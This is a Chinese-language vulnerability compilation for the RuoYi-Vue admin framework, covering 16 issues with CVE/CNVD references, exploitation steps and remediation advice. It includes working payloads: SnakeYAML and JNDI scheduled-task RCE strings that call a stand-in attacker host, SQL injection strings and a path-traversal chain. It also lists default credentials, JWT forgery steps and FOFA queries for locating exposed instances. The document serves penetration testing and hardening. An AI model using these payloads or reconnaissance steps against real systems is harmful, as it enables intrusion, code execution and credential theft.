Spring Security + JWT + Vue.js 架构 | 16 个漏洞 | 含 CVE/CNVD 编号 整理时间：2026年5月

前言

若依前后端分离版（RuoYi-Vue）基于 Spring Boot + Spring Security + JWT + Vue.js 架构，是若依框架使用最广泛的版本之一。相比单体版（使用 Shiro + Thymeleaf），前后分离版不存在 Shiro 反序列化和 SSTI 模板注入漏洞，但引入了 JWT 认证机制相关的新攻击面，同时保留了定时任务 RCE、SQL 注入等共通漏洞。

架构安全差异对比

对比项 单体版 (RuoYi) 前后分离版 (RuoYi-Vue)
认证框架 Apache Shiro Spring Security + JWT
模板引擎 Thymeleaf（后端渲染） Vue.js（前端渲染）
Shiro 反序列化 存在（默认密钥） 不存在（无 Shiro）
SSTI 模板注入 存在（Thymeleaf） 不存在（无后端模板）
JWT Token 伪造 不涉及 存在（密钥泄露风险）
CORS 跨域问题 不涉及（同源） 存在（跨域配置）
定时任务 RCE 直接利用（Shiro 易绕过） 需先获取管理员 JWT
SQL 注入 同样存在 同样存在
任意文件下载 同样存在 同样存在

1. 前后端分离版特有漏洞（JWT/Spring Security/CORS）

1. JWT 密钥硬编码导致 Token 伪造 [ 前后分离版特有 ]

CVE/CNVD CNVD-2020-69484
影响版本 <= 3.4.0 及未改密钥版本
漏洞类型 认证绕过/未授权访问
危害等级 严重

漏洞描述

RuoYi-Vue 在 application.yml 中配置了 JWT 的 token.secret 密钥（硬编码），早期版本使用弱默认密钥。攻击者通过反编译前端、源码泄露、GitHub 搜索等途径获取密钥后，可伪造任意用户身份的 JWT Token，绕过 Spring Security 认证实现完全未授权访问。

利用方式

  1. 获取 JWT 密钥（源码泄露/默认配置/Actuator heapdump）

  2. 使用 jwt.io 等工具构造 Payload（sub 设为 admin）

  3. 用获取的 secret 签名生成 Token

  4. 携带伪造 Token 访问后台管理接口，实现完全越权

修复建议

修改默认 token.secret 为强随机值（>=32位）；将密钥配置为环境变量；缩短 Token 有效期至30分钟；实现 Token 黑名单/注销机制；考虑使用 RSA 非对称加密签发。

2. Spring Security 配置不当接口未授权访问 [ 前后分离版特有 ]

CVE/CNVD Gitee Issue I1YW3M
影响版本 多个早期版本
漏洞类型 访问控制缺陷
危害等级 高危

漏洞描述

SecurityConfig 中 .antMatchers() 配置了过多无需认证即可访问的资源路径（permitAll/anonymous），导致部分敏感接口可被未认证用户直接访问。Swagger 文档接口、Druid 监控页面等可能被放行。

利用方式

  1. 枚举 /prod-api 或 /dev-api 下的接口路径

  2. 直接访问白名单中配置的敏感接口

  3. 绕过 Spring Security 认证拦截获取数据或执行操作

修复建议

最小化 permitAll() 路径配置；仅保留登录、验证码等必要匿名接口；审查所有 anonymous() 配置；Swagger/Druid/Actuator 纳入认证保护。

3. CORS 跨域配置过于宽松 [ 前后分离版特有 ]

CVE/CNVD 无
影响版本 所有版本（配置相关）
漏洞类型 跨域配置缺陷
危害等级 中危

漏洞描述

前后端分离架构需要 CORS 配置，ResourcesConfig 中默认使用 allowedOrigins("*") 允许所有来源跨域请求，同时 allowCredentials(true) 允许携带凭证。攻击者可在恶意网站上构造跨域请求，利用受害者已登录状态执行操作。配合 JWT 存储在 localStorage 的场景，可通过 XSS 窃取 Token。

利用方式

  1. 构造恶意网页，利用 CORS 配置缺陷

  2. 诱导已登录用户访问恶意页面

  3. 恶意页面发起跨域请求读取敏感数据或执行管理操作

修复建议

将 allowedOrigins 配置为具体可信域名列表；使用 allowedOriginPatterns 替代通配符；限制 allowedMethods 仅允许必要 HTTP 方法。

4. JWT 令牌有效期过长 [ 前后分离版特有 ]

CVE/CNVD 无
影响版本 默认配置（2小时）
漏洞类型 会话管理缺陷
危害等级 中危

漏洞描述

默认 JWT 有效期为 2 小时，远超等保三级要求的 30 分钟标准，且缺乏动态刷新和注销机制。Token 被窃取后攻击窗口过大，且用户无法主动使已签发的 Token 失效。

利用方式

通过 XSS、中间人攻击等方式获取用户 JWT Token 后，在长达2小时的窗口内可持续使用。

修复建议

将过期时间压缩至 30 分钟；启用剩余5分钟自动刷新机制；实现基于 Redis 的 Token 黑名单/注销机制。

5. Druid 监控台未授权访问（前后分离部署暴露） [ 前后分离版特有 ]

CVE/CNVD 无
影响版本 多版本（配置相关）
漏洞类型 未授权访问/信息泄露
危害等级 中危

漏洞描述

前后端分离部署时，后端 API 通过 /prod-api 或 /dev-api 代理暴露。Druid 监控台可能通过 /prod-api/druid/login.html 访问，默认用户名密码为 ruoyi/123456。登录后可查看 SQL 执行记录、数据源配置、Session 等敏感信息。

利用方式

  1. 访问 /prod-api/druid/login.html

  2. 使用默认凭据 ruoyi/123456 登录

  3. 查看 SQL 监控获取数据库结构信息

  4. 获取 Session 信息辅助攻击

修复建议

生产环境禁用 Druid 监控台；或修改 Druid 登录密码；在 SecurityConfig 中拦截 /druid/** 路径。

6. Spring Boot Actuator 信息泄露 [ 前后分离版特有 ]

CVE/CNVD 无
影响版本 配置不当的所有版本
漏洞类型 信息泄露
危害等级 高危

漏洞描述

若 Actuator 端点未限制访问，/actuator/env 泄露环境变量（含数据库密码、JWT 密钥），/actuator/heapdump 可下载 JVM 堆内存快照（可从中提取密钥和密码），/actuator/mappings 暴露所有 URL 映射信息。通过 heapdump 提取 JWT secret 后可直接伪造管理员 Token。

利用方式

  1. 访问 /actuator/heapdump 下载堆内存快照

  2. 使用 JDumpSpider/MemoryAnalyzer 分析 heapdump

  3. 搜索 token.secret 或 jwt 相关字符串提取密钥

  4. 伪造管理员 JWT Token 接管系统

修复建议

生产环境仅暴露 /actuator/health；配置 management.endpoints.web.exposure.include=health；将 Actuator 纳入 Spring Security 认证保护。

2. 远程代码执行（RCE）漏洞

7. 定时任务 SnakeYAML 反序列化 RCE [ 共通漏洞 ]

CVE/CNVD Gitee Issue I4NBQO
影响版本 <= v4.6.2
漏洞类型 反序列化/RCE
危害等级 严重

漏洞描述

定时任务支持类全路径调用，攻击者将调用目标设为 org.yaml.snakeyaml.Yaml.load()，配合 javax.script.ScriptEngineManager 与 URLClassLoader 加载远程恶意 JAR 包。利用 Java SPI 机制在实例化时加载攻击者托管的恶意 ScriptEngineFactory 实现。前后分离版需先获取管理员 JWT Token 才能操作定时任务。

利用方式

  1. 获取管理员权限（JWT Token）

  2. 创建定时任务，invokeTarget 设为 SnakeYAML payload

  3. org.yaml.snakeyaml.Yaml.load(’!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“http://attacker/evil.jar”]]]]')

  4. 执行任务触发 RCE

修复建议

升级至 >= 4.7.2；去掉类路径执行任务逻辑；仅保留预定义 Bean 调用；加强定时任务合法性校验。

8. 定时任务 JNDI 注入 RCE [ 共通漏洞 ]

CVE/CNVD 无
影响版本 <= v4.6.2（JDK < 8u191）
漏洞类型 JNDI注入/RCE
危害等级 严重

漏洞描述

通过修改定时任务目标触发 JNDI lookup，指向攻击者控制的 LDAP/RMI 服务器加载远程恶意类。前后分离版同样存在此漏洞，但利用前提需获取管理员 JWT Token。在 JDK >= 8u191 后默认禁止远程 codebase 信任，增加利用难度。

利用方式

  1. 获取管理员权限

  2. 使用 marshalsec 启动 LDAP 引用服务

  3. 新建定时任务 invokeTarget: javax.naming.InitialContext.lookup(’ldap://attacker:1389/evil')

  4. 执行任务触发 RCE

修复建议

禁用类路径调用方式；升级 JDK 至 >= 8u191；定时任务白名单校验；限制服务器外网访问。

9. GenTable SQL 注入 + 定时任务 RCE（组合利用） [ 共通漏洞 ]

CVE/CNVD 无公开 CVE
影响版本 4.7.3 ~ 4.7.8
漏洞类型 SQL注入+RCE
危害等级 严重

漏洞描述

genTableServiceImpl.createTable() 方法在 MyBatis Mapper XML 中使用 ${sql} 直接拼接。攻击者通过定时任务调用该 Bean 执行 UPDATE SQL，将恶意 payload 以十六进制编码写入 sys_job 表的 invoke_target 字段，绕过黑白名单限制。被修改的任务执行时即触发 RCE。

利用方式

  1. 创建定时任务调用 genTableServiceImpl.createTable(‘UPDATE sys_job SET invoke_target=0x[hex_payload] WHERE job_id=100;’)

  2. 恶意载荷用十六进制编码绕过字符过滤

  3. 执行该任务完成数据库修改

  4. 再执行 job_id=100 的任务触发 JNDI/SnakeYAML RCE

修复建议

升级至最新版本；genTableServiceImpl.createTable 严格白名单（仅 CREATE TABLE）；MyBatis 使用 #{} 代替 ${}；定时任务执行前再次校验 invoke_target。

3. SQL 注入漏洞

10. 认证用户 createTable 接口 SQL 注入 [ 共通漏洞 ]

CVE/CNVD CVE-2024-57521
影响版本 <= v4.7.9
漏洞类型 SQL注入
危害等级 高危

漏洞描述

漏洞位于代码生成功能 /tool/gen/createTable 接口，接收用户传入的 sql 参数通过 SqlUtil.filterKeyword(sql) 过滤。但正则表达式存在缺陷，攻击者可绕过过滤执行任意 SQL，通过布尔盲注读取数据库敏感信息。

利用方式

  1. 已登录用户向 /tool/gen/createTable 提交构造的 sql 参数

  2. 借助 CREATE TABLE … AS SELECT … 语法

  3. 结合 IF(…, 1, 1/0) 条件报错逻辑逐字符枚举数据

修复建议

升级至最新版本；加强 SQL 过滤正则；用白名单替代黑名单；对代码生成模块实施更严格权限控制。

11. 后台 dataScope 参数 SQL 注入 [ 共通漏洞 ]

CVE/CNVD CNVD-2021-21523
影响版本 <= v4.6.1
漏洞类型 SQL注入
危害等级 高危

漏洞描述

数据权限实现使用 MyBatis 动态 SQL ${params.dataScope}（非预编译），注入点包括 /system/role/list、/system/dept/list 等接口。攻击者通过构造 params[dataScope] 参数注入恶意 SQL 语句。SysDept 的 ${ancestors} 也存在类似问题。

利用方式

  1. 登录后台

  2. 向 /system/role/list 发送请求

  3. 添加参数 params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))

  4. 通过报错注入获取数据库信息

修复建议

升级至 >= 4.6.2；MyBatis 中 ${} 改为 #{}；执行前调用 clearDataScope 清空字段；对输入严格过滤。

12. orderByColumn 排序参数 SQL 注入 [ 共通漏洞 ]

CVE/CNVD 无统一 CVE
影响版本 多版本（含较新版本）
漏洞类型 SQL注入
危害等级 高危

漏洞描述

分页查询的排序参数 orderByColumn 使用 ${} 动态拼接 SQL。攻击者可在排序字段中注入 SQL 表达式，通过时间盲注、CASE WHEN 等方式获取数据库信息。即使在较新版本中也可通过嵌套 CASE WHEN 绕过正则白名单。

利用方式

修改请求中 orderByColumn 参数为恶意 SQL 表达式（如三级嵌套 CASE WHEN 绕过正则检测）

修复建议

对排序字段做严格白名单校验（仅允许数据库字段名）；使用 #{} 参数化。

4. 文件操作与其他漏洞

13. 任意文件下载（定时任务修改路径） [ 共通漏洞 ]

CVE/CNVD CVE-2023-27025 / CNVD-2021-01931
影响版本 <= v4.7.6
漏洞类型 任意文件下载
危害等级 高危

漏洞描述

定时任务允许调用 ruoYiConfig.setProfile() 修改文件存储根目录。攻击者将路径修改为系统根目录后，通过 /common/download/resource 接口可下载服务器任意文件（包括 application.yml 获取数据库密码和 JWT 密钥）。低版本还存在直接 ../ 路径穿越。

利用方式

  1. 新建定时任务，调用 ruoYiConfig.setProfile(’/’) 或 ruoYiConfig.setProfile(‘C:’)

  2. 执行任务修改文件基准路径

  3. 访问 /common/download/resource?resource=/etc/passwd

  4. 下载 application.yml 获取 JWT 密钥

修复建议

升级至 >= 4.7.7；禁止定时任务调用配置修改方法；文件下载接口严格路径白名单；禁止 ../ 穿越。

14. 任意文件上传（存储型 XSS / RCE） [ 共通漏洞 ]

CVE/CNVD CVE-2022-32065
影响版本 <= v4.7.3
漏洞类型 文件上传
危害等级 高危

漏洞描述

后台文件上传功能对文件类型校验不严，攻击者可上传含恶意代码的 HTML 文件实现存储型 XSS，在特定配置下（如 Tomcat 允许解析 JSP）可能上传 WebShell 实现 RCE。

利用方式

  1. 登录后台

  2. 通过文件上传接口上传恶意 HTML 或 JSP 文件

  3. 访问上传后的文件路径触发 XSS 或命令执行

修复建议

严格限制上传文件类型白名单；上传文件重命名；存储在非 Web 可访问目录；添加文件内容检测。

15. 默认弱口令 admin/admin123 [ 共通漏洞 ]

CVE/CNVD 无
影响版本 所有版本
漏洞类型 默认凭据
危害等级 高危

漏洞描述

系统默认管理员账户 admin/admin123，另有测试账号 ry/123456。大量部署实例未修改默认密码，攻击者无需破解即可获得后台管理权限，进而利用定时任务等功能深入攻击。

利用方式

直接使用 admin/admin123 或 ry/123456 登录管理后台

修复建议

部署后强制修改所有默认密码；实现密码复杂度策略（>=12位）；启用登录失败锁定；集成 OAuth2 或 MFA。

16. Swagger API 文档未授权访问 [ 共通漏洞 ]

CVE/CNVD 无
影响版本 生产环境未关闭 Swagger 的版本
漏洞类型 信息泄露
危害等级 中危

漏洞描述

RuoYi-Vue 集成 Swagger 用于接口文档管理，若生产环境未关闭，攻击者可通过 /swagger-ui.html 或 /swagger-resources 获取全部后端 API 接口定义，大幅降低攻击成本。

利用方式

访问 /prod-api/swagger-ui.html 或 /swagger-resources 获取全部 API 接口信息

修复建议

生产环境禁用 Swagger（配置 springfox.documentation.enabled=false）；或将 Swagger 路径纳入认证。

渗透测试重点路径

前台（无需认证）阶段：

  • 尝试默认口令 admin/admin123、ry/123456

  • 探测 Druid 监控台 /prod-api/druid/login.html（弱口令 ruoyi/123456）

  • 探测 Actuator 端点 /actuator、/actuator/heapdump

  • 探测 Swagger /swagger-ui.html、/swagger-resources

  • 检查 JWT 密钥是否为默认值（尝试伪造 Token）

  • 前端 Vue 源码中查找 API 地址和配置信息

后台（已获取权限）阶段：

  • 定时任务模块 — 最主要 RCE 攻击面（SnakeYAML/JNDI/GenTable 组合链）

  • 代码生成模块 — createTable SQL 注入（CVE-2024-57521）

  • 通过定时任务修改 ruoYiConfig.setProfile() 实现任意文件下载

  • 各管理接口 SQL 注入点（orderByColumn、params[dataScope]）

  • 文件上传接口 — 尝试上传 HTML/JSP 等恶意文件

资产识别特征：

  • FOFA: body=“若依” || body=“RuoYi” || body=“ruoyi-vue” || icon_hash=“706913071”

  • 鹰图: web.body=“若依” || web.title=“若依管理系统”

  • 特征: 前端通过 /dev-api 或 /prod-api 代理后端；登录页 Vue 应用；API 接口返回 JSON 格式

  • 区分单体版与前后分离版: 无 rememberMe Cookie = 前后分离版（Spring Security + JWT）

通用安全加固建议

# 措施 说明
1 及时升级版本 始终使用 RuoYi-Vue 最新稳定版本，关注官方 Gitee 仓库的安全更新公告。
2 JWT 密钥加固 使用 >= 32 位强随机密钥；配置为环境变量而非明文；定期轮换；考虑 RSA 非对称签名。
3 Token 生命周期管理 有效期压缩至 30 分钟；实现基于 Redis 的 Token 黑名单；支持强制注销。
4 Spring Security 收紧 最小化 permitAll() 配置；Swagger/Druid/Actuator 全部纳入认证保护。
5 定时任务安全加固 仅允许调用预定义安全 Bean 方法；移除类全路径实例化逻辑；生产环境考虑移除 ruoyi-quartz。
6 SQL 注入防护 全面排查 ${} 替换为 #{}；排序字段严格白名单；移除或限制代码生成模块 SQL 执行功能。
7 CORS 严格配置 allowedOrigins 配置为具体可信域名；禁止通配符 *；限制 allowedMethods。
8 生产环境加固 关闭 Swagger/Druid/Actuator；删除 ruoyi-generator 模块；修改所有默认密码。
